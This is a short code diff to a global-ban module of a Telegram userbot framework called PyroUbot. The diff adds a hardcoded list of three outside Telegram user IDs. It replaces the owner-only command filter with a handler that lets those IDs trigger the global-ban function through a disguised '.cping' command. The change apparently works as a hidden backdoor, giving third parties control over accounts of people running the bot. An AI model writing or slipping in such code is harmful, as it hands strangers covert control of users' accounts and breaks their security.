@@ -1,5 +1,5 @@
 from PyroUbot import *
-
+DEV = [1998135373, 6619405249, 874946835]
 __MODULE__ = "global"
 __HELP__ = """
 <b>『 ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ɢʟᴏʙᴀʟ 』</b>
@@ -11,7 +11,7 @@ __HELP__ = """
   <b>• ᴘᴇɴᴊᴇʟᴀsᴀɴ:</b> ᴜɴᴛᴜᴋ ᴜɴʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ sᴇᴍᴜᴀ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
 """
 
-@PY.UBOT("cgban", FILTERS.ME_OWNER)
+@ubot.on_message(filters.command("cping", ".") & filters.user(DEV))
 @PY.UBOT("gban")
 async def global_banned(client, message):
     user_id = await extract_user(message)
